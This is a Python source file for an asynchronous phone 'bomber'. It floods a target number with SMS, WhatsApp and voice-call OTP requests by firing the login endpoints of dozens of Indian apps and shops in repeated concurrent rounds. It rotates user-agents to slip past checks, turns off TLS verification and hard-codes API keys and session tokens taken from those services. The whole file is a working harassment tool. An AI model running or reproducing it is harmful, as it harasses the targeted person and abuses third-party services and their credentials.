# language: Python, file: bomber.py, runtime: Python 3.10+, target: Linux/Render

import asyncio
import aiohttp
import time
import random

try:
    import uvloop
    uvloop.install()
except ImportError:
    pass


# ── rotating user-agents (Indian mobile Chrome — matches what these APIs expect) ──
_UA_POOL = [
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.53 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.40 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; POCO X5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; vivo V27) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.36",
]

def _ua() -> str:
    return random.choice(_UA_POOL)


# ── body-aware success validation ─────────────────────────────────────────────
# ONLY explicit compound fail patterns — no bare words like "false" or "error"
_FAIL_PATTERNS = (
    '"success":false',
    '"success": false',
    '"status":"failed"',
    '"status": "failed"',
    '"status":"error"',
    '"status": "error"',
    '"code":"error"',
    '"code": "error"',
    '"otp_sent":false',
    '"otp_sent": false',
    '"sent":false',
    '"sent": false',
    'otp not sent',
    'invalid mobile',
    'invalid phone',
    'number not registered',
    'too many requests',
    'rate limit exceeded',
    'blocked',
    'captcha required',
)

def _check_fired(status: int, body: str, cfg: dict) -> bool:
    if status >= 400:
        return False
    bl = body.lower()
    for pat in _FAIL_PATTERNS:
        if pat in bl:
            # success_hint can override a specific false-positive
            hint = cfg.get("success_hint", "")
            if hint and hint.lower() in bl:
                return True
            return False
    hint = cfg.get("success_hint", "")
    if hint:
        return hint.lower() in bl
    return True   # 2xx, no fail pattern → real hit


# ── single _fire ──────────────────────────────────────────────────────────────
async def _fire(session: aiohttp.ClientSession, cfg: dict, phone: str):
    try:
        url  = cfg["url"](phone) if callable(cfg["url"]) else cfg["url"]
        data = cfg["data"](phone) if cfg["data"] else None

        # inject rotating UA unless config hard-codes one
        h = {}
        for k, v in cfg["headers"].items():
            h[k] = v(data) if callable(v) else v
        if "User-Agent" not in h:
            h["User-Agent"] = _ua()

        to = aiohttp.ClientTimeout(total=12.0, connect=5.0, sock_read=7.0)

        if cfg["method"] == "GET":
            async with session.get(url, headers=h, timeout=to, ssl=False) as r:
                body  = (await r.text())[:400]
                fired = _check_fired(r.status, body, cfg)
                print(f"[{cfg['name']}] {r.status} fired={fired} | {body[:100]}")
                return cfg["name"], cfg["type"], fired
        else:
            async with session.post(url, headers=h, data=data, timeout=to, ssl=False) as r:
                body  = (await r.text())[:400]
                fired = _check_fired(r.status, body, cfg)
                print(f"[{cfg['name']}] {r.status} fired={fired} | {body[:100]}")
                return cfg["name"], cfg["type"], fired
    except Exception as e:
        print(f"[{cfg['name']}] TIMEOUT/ERR | {str(e)[:80]}")
        return cfg["name"], cfg["type"], False


# ── API configs ───────────────────────────────────────────────────────────────
API_CONFIGS = [

    # ══════════════════════════════════════════════════════════════════════════
    # SMS — datacenter-friendly (small Indian services, less strict IP checks)
    # ══════════════════════════════════════════════════════════════════════════
    {
        "name": "IndiaMART",
        "url": "https://my.indiamart.com/api/otp.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://my.indiamart.com",
            "Referer": "https://my.indiamart.com/",
        },
        "data": lambda p: f"mobile={p}&flag=1",
        "type": "SMS",
    },
    {
        "name": "Meesho",
        "url": "https://meesho.com/api/v1/user/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://meesho.com",
            "Referer": "https://meesho.com/",
        },
        "data": lambda p: f'{{"phone":"+91{p}"}}',
        "type": "SMS",
    },
    {
        "name": "NoBroker",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.nobroker.in",
            "Referer": "https://www.nobroker.in/",
        },
        "data": lambda p: f"phone={p}&countryCode=IN",
        "type": "SMS",
    },
    {
        "name": "Wakefit",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "API-Secret-Key": "ycq55IbIjkLb",
            "API-Token": "c84d563b77441d784dce71323f69eb42",
            "Origin": "https://www.wakefit.co",
        },
        "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}',
        "type": "SMS",
    },
    {
        "name": "Shiprocket",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "authorization": "Bearer null",
            "Origin": "https://app.shiprocket.in",
        },
        "data": lambda p: f'{{"mobileNumber":"{p}"}}',
        "type": "SMS",
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "User-Agent": "okhttp/3.9.1",
        },
        "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}',
        "type": "SMS",
    },
    {
        "name": "Univest",
        "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}",
        "method": "GET",
        "headers": {"User-Agent": "okhttp/3.9.1"},
        "data": None,
        "type": "SMS",
    },
    {
        "name": "Jockey SMS",
        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false",
        "method": "GET",
        "headers": {"Referer": "https://www.jockey.in/"},
        "data": None,
        "type": "SMS",
    },
    {
        "name": "Stratzy SMS",
        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
        "method": "POST",
        "headers": {
            "content-type": "application/json",
            "origin": "https://stratzy.in",
        },
        "data": lambda p: f'{{"phoneNo":"{p}"}}',
        "type": "SMS",
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://smytten.com",
            "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f",
        },
        "data": lambda p: f'{{"phone":"{p}","email":"test@gmail.com","device_platform":"web"}}',
        "type": "SMS",
    },
    {
        "name": "LendingPlate",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://lendingplate.com",
        },
        "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3",
        "type": "SMS",
    },
    {
        "name": "Hungama",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "country_code": "IN",
            "Origin": "https://www.hungama.com",
        },
        "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","device":"web","variant":"v1","templateCode":1}}',
        "type": "SMS",
    },
    {
        "name": "GoPinkCabs",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.gopinkcabs.com",
        },
        "data": lambda p: f"check_mobile_number=1&contact={p}",
        "type": "SMS",
    },
    {
        "name": "Beepkart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "appname": "Website",
            "Origin": "https://www.beepkart.com",
        },
        "data": lambda p: f'{{"phone":"{p}","city":362,"source":"myaccount","consent":false}}',
        "type": "SMS",
    },
    {
        "name": "NewMe",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Caller": "web_app",
            "Origin": "https://newme.asia",
        },
        "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}',
        "type": "SMS",
    },
    {
        "name": "Snitch",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "client-id": "snitch_secret",
            "Origin": "https://www.snitch.com",
        },
        "data": lambda p: f'{{"mobile_number":"+91{p}"}}',
        "type": "SMS",
    },
    {
        "name": "WellAcademy",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://wellacademy.in",
        },
        "data": lambda p: f'{{"contact_no":"{p}"}}',
        "type": "SMS",
    },
    {
        "name": "Servetel",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13)",
        },
        "data": lambda p: f"mobile_number={p}",
        "type": "SMS",
    },
    {
        "name": "MeruCabs",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Mid": "287187234bae1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "okhttp/4.9.0",
        },
        "data": lambda p: f"mobile_number={p}",
        "type": "SMS",
    },
    {
        "name": "BikeFixup",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=UTF-8",
            "client": "app",
            "User-Agent": "Dart/3.6 (dart:io)",
        },
        "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}',
        "type": "SMS",
    },
    {
        "name": "Lenskart",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "X-API-Client": "mobilesite",
            "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a",
            "X-Country-Code": "IN",
            "Origin": "https://www.lenskart.com",
        },
        "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}',
        "type": "SMS",
    },
    {
        "name": "Shemaroo",
        "url": "https://www.shemarooме.com/users/resend_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.shemarooме.com",
        },
        "data": lambda p: f"mobile_no=%2B91{p}",
        "type": "SMS",
    },
    {
        "name": "Rapido",
        "url": "https://api.rapido.bike/api/auth/v5/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://rapido.bike",
        },
        "data": lambda p: f'{{"phoneNo":"{p}","countryCode":"+91"}}',
        "type": "SMS",
    },
    {
        "name": "Tata1mg",
        "url": "https://www.1mg.com/api/v5/auth/request_login_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.1mg.com",
        },
        "data": lambda p: f'{{"phone":"{p}","type":"phone"}}',
        "type": "SMS",
    },
    {
        "name": "Puma",
        "url": "https://in.puma.com/api/account/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://in.puma.com",
        },
        "data": lambda p: f'{{"phone":"{p}","country_code":"IN"}}',
        "type": "SMS",
    },
    {
        "name": "Vedantu",
        "url": "https://api.vedantu.com/api/v4/users/mobileOTP",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
        },
        "data": lambda p: f'{{"mobile":"{p}","country_code":"+91"}}',
        "type": "SMS",
    },
    {
        "name": "CoinDCX",
        "url": "https://coindcx.com/api/v1/auth/sms_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://coindcx.com",
        },
        "data": lambda p: f'{{"mobile":"{p}","country_code":"91"}}',
        "type": "SMS",
    },
    {
        "name": "Groww",
        "url": "https://groww.in/v1/api/user/login",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://groww.in",
        },
        "data": lambda p: f'{{"mobileNo":"{p}"}}',
        "type": "SMS",
    },

    # ══════════════════════════════════════════════════════════════════════════
    # WhatsApp — stateless endpoints only (no prior session required)
    # ══════════════════════════════════════════════════════════════════════════
    {
        "name": "EkaCare WA",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {
            "Device-Id": "5df83c463f0ff8ff",
            "Flavour": "android",
            "Version": "1382",
            "Client-Id": "androidp",
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "okhttp/4.9.3",
        },
        "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}',
        "type": "WA",
    },
    {
        "name": "KPNFresh WA",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json; charset=UTF-8",
            "User-Agent": "okhttp/5.0.0-alpha.11",
        },
        "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}',
        "type": "WA",
    },
    {
        "name": "Rappi WA",
        "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2)",
        },
        "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}',
        "type": "WA",
    },
    {
        "name": "Foxy WA",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Platform": "web",
            "Origin": "https://www.foxy.in",
            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
        },
        "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}',
        "type": "WA",
    },
    {
        "name": "Jockey WA",
        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true",
        "method": "GET",
        "headers": {"Referer": "https://www.jockey.in/"},
        "data": None,
        "type": "WA",
    },
    {
        "name": "Stratzy WA",
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {
            "content-type": "application/json",
            "origin": "https://stratzy.in",
        },
        "data": lambda p: f'{{"phoneNo":"{p}"}}',
        "type": "WA",
    },
    {
        "name": "Meesho WA",
        "url": "https://meesho.com/api/v1/user/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://meesho.com",
        },
        "data": lambda p: f'{{"phone":"+91{p}","channel":"whatsapp"}}',
        "type": "WA",
    },
    {
        "name": "NoBroker WA",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.nobroker.in",
        },
        "data": lambda p: f"phone={p}&countryCode=IN&type=WHATSAPP",
        "type": "WA",
    },

    # ══════════════════════════════════════════════════════════════════════════
    # CALL OTP — voice call delivers the code
    # ══════════════════════════════════════════════════════════════════════════
    {
        "name": "IndiaMART CALL",
        "url": "https://my.indiamart.com/api/otp.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://my.indiamart.com",
        },
        "data": lambda p: f"mobile={p}&flag=2",
        "type": "CALL",
    },
    {
        "name": "NoBroker CALL",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.nobroker.in",
        },
        "data": lambda p: f"phone={p}&countryCode=IN&type=CALL",
        "type": "CALL",
    },
    {
        "name": "PenPencil CALL",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "User-Agent": "okhttp/3.9.1",
        },
        "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}',
        "type": "CALL",
    },
    {
        "name": "Truecaller CALL",
        "url": "https://account-asia-south1.truecaller.com/v1/phoneVoiceCall",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "clientId": "android-app-v2",
            "User-Agent": "Truecaller/12 Dalvik/2.1.0 (Linux; U; Android 13)",
        },
        "data": lambda p: f'{{"phoneNo":"+91{p}","countryCode":"IN"}}',
        "type": "CALL",
    },
    {
        "name": "Rapido CALL",
        "url": "https://api.rapido.bike/api/auth/v5/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://rapido.bike",
        },
        "data": lambda p: f'{{"phoneNo":"{p}","countryCode":"+91","channel":"voice"}}',
        "type": "CALL",
    },
    {
        "name": "MeruCabs CALL",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Mid": "287187234bae1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "okhttp/4.9.0",
        },
        "data": lambda p: f"mobile_number={p}&type=call",
        "type": "CALL",
    },
    {
        "name": "Jockey CALL",
        "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?call=true",
        "method": "GET",
        "headers": {"Referer": "https://www.jockey.in/"},
        "data": None,
        "type": "CALL",
    },
    {
        "name": "Ola CALL",
        "url": "https://user.olacabs.com/v1/user/mobile",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "X-App-Token": "4ac01f46-7dd0-4ae9-9a0f-4564b55c7d12",
        },
        "data": lambda p: f'{{"mobile_number":"{p}","country_code":"IND","delivery_mode":"call"}}',
        "type": "CALL",
    },
]


# ── runner ────────────────────────────────────────────────────────────────────
async def run_bomber(phone: str, mode: str = "ALL", rounds: int = 1) -> dict:
    pool = (
        API_CONFIGS if mode == "ALL"
        else [c for c in API_CONFIGS if c["type"] == mode]
    )
    connector = aiohttp.TCPConnector(
        limit=0,
        limit_per_host=15,
        ttl_dns_cache=300,
        force_close=False,
        enable_cleanup_closed=True,
    )
    sms_fired = wa_fired = call_fired = total_fired = 0
    start = time.time()

    async with aiohttp.ClientSession(
        connector=connector,
        headers={"Accept": "*/*", "Accept-Language": "en-IN,en;q=0.9"},
    ) as session:
        all_tasks = [
            _fire(session, cfg, phone)
            for _ in range(rounds)
            for cfg in pool
        ]
        results = await asyncio.gather(*all_tasks, return_exceptions=True)
        for res in results:
            if isinstance(res, Exception):
                continue
            name, typ, fired = res
            if fired:
                total_fired += 1
                if typ == "SMS":    sms_fired  += 1
                elif typ == "WA":   wa_fired   += 1
                elif typ == "CALL": call_fired += 1

    elapsed = time.time() - start
    total   = len(pool) * rounds
    return {
        "sms":   sms_fired,
        "wa":    wa_fired,
        "call":  call_fired,
        "fired": total_fired,
        "total": total,
        "rps":   round(total / elapsed, 2) if elapsed else 0,
    }
